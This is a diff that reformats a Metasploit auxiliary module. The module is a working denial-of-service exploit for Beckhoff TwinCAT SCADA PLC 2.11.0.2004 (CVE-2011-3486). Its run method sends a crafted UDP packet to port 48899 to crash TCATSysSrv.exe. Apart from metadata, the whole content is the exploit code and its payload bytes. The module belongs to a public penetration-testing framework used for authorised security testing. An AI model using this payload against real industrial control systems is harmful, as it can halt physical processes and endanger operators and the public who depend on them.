@@ -1,44 +1,47 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Udp
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Beckhoff TwinCAT SCADA PLC 2.11.0.2004 DoS',
-      'Description'    => %q{
-        The Beckhoff TwinCAT version <= 2.11.0.2004 can be brought down by sending
-        a crafted UDP packet to port 48899 (TCATSysSrv.exe).
-      },
-      'Author'         =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Beckhoff TwinCAT SCADA PLC 2.11.0.2004 DoS',
+        'Description' => %q{
+          The Beckhoff TwinCAT version <= 2.11.0.2004 can be brought down by sending
+          a crafted UDP packet to port 48899 (TCATSysSrv.exe).
+        },
+        'Author' => [
           'Luigi Auriemma', # Public exploit
-          'jfa',            # Metasploit module
+          'jfa', # Metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2011-3486' ],
           [ 'OSVDB', '75495' ],
           [ 'URL', 'http://aluigi.altervista.org/adv/twincat_1-adv.txt' ]
         ],
-      'DisclosureDate' => 'Sep 13 2011'
-    ))
+        'DisclosureDate' => '2011-09-13',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options([Opt::RPORT(48899)])
   end
 
   def run
-    dos = "\x03\x66\x14\x71" + "\x00"*16 + "\xff"*1514
+    dos = "\x03\x66\x14\x71" + "\x00" * 16 + "\xff" * 1514
     connect_udp
-    print_status("Sending DoS packet ...")
+    print_status('Sending DoS packet ...')
     udp_sock.put(dos)
     disconnect_udp
   end
